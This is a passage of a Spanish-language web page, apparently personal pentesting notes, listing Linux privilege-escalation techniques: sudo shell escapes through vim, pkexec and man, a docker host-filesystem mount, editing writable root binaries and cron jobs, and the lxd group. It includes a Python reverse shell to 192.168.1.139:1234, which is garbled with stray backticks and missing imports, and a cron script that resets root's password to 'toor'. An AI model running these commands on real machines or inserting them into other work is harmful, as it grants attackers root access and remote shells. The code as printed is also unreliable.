+<p>al hacer un <strong>strings</strong> se vió que contenía el comado <strong>curl</strong> y estaba incluido con ruta relativa y no absoluta, lo que ayudó a acontecer un <a href="https://glmbxecurity.github.io/docs/5-hacking-linux/path-hijacking/">Path Hijacking</a></p>
+<h3 id="sudo--l">
+  SUDO -L
+  <a class="anchor" href="#sudo--l">#</a>
+</h3>
+<p>Si encontramos un binario que con ==sudo -l== vemos que podemos ejecutarlo como si fueramos el administrador, podemos buscar en <strong>GTFOBins</strong></p>
+<h4 id="sudo--l-vim">
+  Sudo -L VIM
+  <a class="anchor" href="#sudo--l-vim">#</a>
+</h4>
+<p>Si encontramos vim con sudo -l. Abrimos vim</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo vim -c <span style="color:#e6db74">&#39;:!/bin/sh&#39;</span>
+</span></span></code></pre></div><p>Alternativa:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/vim
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Una vez abierto:
+</span></span><span style="display:flex;"><span>:set shell<span style="color:#f92672">=</span>/bin/bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pulsamos INTRO y luego escribimos
+</span></span><span style="display:flex;"><span>:shell
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pulsamos INTRO y ya somos root
+</span></span></code></pre></div><h4 id="sudo--l-pkexec">
+  Sudo -L Pkexec
+  <a class="anchor" href="#sudo--l-pkexec">#</a>
+</h4>
+<p>con este binario con permisos SUID se ejecuta un CVE, pero cuando tenemos permisos para ejecutar como el propietario, se puede hacer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo pkexec /bin/sh
+</span></span></code></pre></div><h3 id="docker">
+  Docker
+  <a class="anchor" href="#docker">#</a>
+</h3>
+<p>Pudiendo ejecutar docker sin ser root, se puede escalar privilegios y montar el sistema de ficheros de la maquina real en el contenedor de forma que podremos acceder a todo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</span></span></code></pre></div><blockquote>
+<p>NOTA
+Seremos root en el contenedor, no en la máquina. Pero podremos acceder a todo el sistema de ficheros.</p>
+</blockquote>
+<h3 id="binario-con-permisos-de-edición-y-ejecución">
+  Binario con permisos de edición y ejecución
+  <a class="anchor" href="#binario-con-permisos-de-edici%c3%b3n-y-ejecuci%c3%b3n">#</a>
+</h3>
+<p>Con sudo -l vemos que se puede ejecutar como root, sus permisos nos deja editar el fichero, algo así ==rwxrwxrwx==. editamos dicho binario y le metemos el comando ==su -==.</p>
+<h3 id="tareas-cron">
+  Tareas cron
+  <a class="anchor" href="#tareas-cron">#</a>
+</h3>
+<p>Si detectamos un binario que se ejecuta a intervalos regulares, con privilegios de root y lo podemos editar para escalar privilegios o darnos una reverse shell como root.</p>
+<h4 id="crontab">
+  Crontab
+  <a class="anchor" href="#crontab">#</a>
+</h4>
+<p>El fichero <strong>/etc/cron.d</strong> establece las tareas que se ejecutan y se configuran a intervalos regulares. Si lo podemos editar, podemos hacer ejecutar un script para escalar privilegios.</p>
+<h5 id="tarea-cron-python-reverse-shell">
+  Tarea cron python (reverse shell)
+  <a class="anchor" href="#tarea-cron-python-reverse-shell">#</a>
+</h5>
+<p>Si es editable añadimos el siguiente codigo para establecer una reverse shell con tareas cron. (y nos ponemos a la escucha):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#75715e">#!/bin/python3`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">import</span> sys<span style="color:#960050;background-color:#1e0010">`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">import</span> time<span style="color:#960050;background-color:#1e0010">`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">import</span> subprocess<span style="color:#960050;background-color:#1e0010">`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#66d9ef">if</span><span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#960050;background-color:#1e0010">`</span>__name__ <span style="color:#f92672">==</span><span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#e6db74">&#34;__main__&#34;</span><span style="color:#960050;background-color:#1e0010">``</span>:<span style="color:#960050;background-color:#1e0010">`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">`</span>s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM);s<span style="color:#f92672">.</span>connect((<span style="color:#960050;background-color:#1e0010">``</span><span style="color:#e6db74">&#34;192.168.1.139&#34;</span><span style="color:#960050;background-color:#1e0010">``</span>,<span style="color:#ae81ff">1234</span>));os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>);p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#960050;background-color:#1e0010">``</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#960050;background-color:#1e0010">``</span>,<span style="color:#960050;background-color:#1e0010">``</span><span style="color:#e6db74">&#34;-i&#34;</span><span style="color:#960050;background-color:#1e0010">``</span>])<span style="color:#960050;background-color:#1e0010">`</span>
+</span></span></code></pre></div><h5 id="tarea-cron-bash-cambio-contraseña-root">
+  Tarea cron bash (cambio contraseña root)
+  <a class="anchor" href="#tarea-cron-bash-cambio-contrase%c3%b1a-root">#</a>
+</h5>
+<p>Este script, establece al usuario root, la <strong>contraseña: &ldquo;toor&rdquo;</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>echo -e <span style="color:#e6db74">&#34;toor\ntoor&#34;</span> | passwd root
+</span></span></code></pre></div><h3 id="escalada-privilegios-con-man">
+  Escalada privilegios con man
+  <a class="anchor" href="#escalada-privilegios-con-man">#</a>
+</h3>
+<p>Tanto escalada como pivoting, si podemos ejecutar un binario como otro usuario (Sudo -L), y este binario tiene un manual, este se nos abre con vim. Lo que ocurre es que vim tiene un modo de comandos, en el que facilmente podemos hacer un:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!/bin/bash
+</span></span></code></pre></div><p>y nos lanzamos una bash como ese usuario con el que ejecutamos el binario.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -u usuario /bin/binario
+</span></span></code></pre></div><h3 id="vulnerabilidad-lxd">
+  Vulnerabilidad lxd
+  <a class="anchor" href="#vulnerabilidad-lxd">#</a>
+</h3>
+<p>si el usuario pertenede al grupo lxd, (comprobar con comando id), existe un exploit para escalar privilegios a root.
+<a href="https://github.com/initstring/lxd_root">https://github.com/initstring/lxd_root</a></p>
+<h3 id="herramientas-automatizadas-escalada-privilegios">
+  Herramientas automatizadas escalada privilegios
+  <a class="anchor" href="#herramientas-automatizadas-escalada-privilegios">#</a>
+</h3>
+<h4 id="les-linux-exploit-suggester">
+  LES (Linux exploit suggester)
+  <a class="anchor" href="#les-linux-exploit-suggester">#</a>
+</h4>
+<p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">Linux Exploit Suggester</a>
+Herramienta que busca vulnerabilidades a nivel de kernel de linux</p>
+<h4 id="linpeas">
+  linPEAS
+  <a class="anchor" href="#linpeas">#</a>
+</h4>
+<p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>
+Herramienta que busca posibles malas configuraciones en la maquina para intentar escalar privilegios</p>
+<h3 id="pspy">
+  Pspy
+  <a class="anchor" href="#pspy">#</a>
+</h3>
+<p><a href="https://github.com/DominicBreuker/pspy">Pspy</a>
+Herramienta para monitorizar tareas cron</p>
+<h3 id="escalada-privilegios-con-path-hijacking">
+  Escalada privilegios con path hijacking
+  <a class="anchor" href="#escalada-privilegios-con-path-hijacking">#</a>
+</h3>
+<!-- raw HTML omitted -->
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#primeras-comprobaciones">Primeras comprobaciones</a></li>
+        <li><a href="#capabilities">Capabilities</a></li>
+        <li><a href="#permisos-suid-y-guid">Permisos SUID y GUID</a></li>
+        <li><a href="#sudo--l">SUDO -L</a></li>
+        <li><a href="#docker">Docker</a></li>
+        <li><a href="#binario-con-permisos-de-edición-y-ejecución">Binario con permisos de edición y ejecución</a></li>
+        <li><a href="#tareas-cron">Tareas cron</a></li>
+        <li><a href="#escalada-privilegios-con-man">Escalada privilegios con man</a></li>
+        <li><a href="#vulnerabilidad-lxd">Vulnerabilidad lxd</a></li>
+        <li><a href="#herramientas-automatizadas-escalada-privilegios">Herramientas automatizadas escalada privilegios</a></li>
+        <li><a href="#pspy">Pspy</a></li>
+        <li><a href="#escalada-privilegios-con-path-hijacking">Escalada privilegios con path hijacking</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
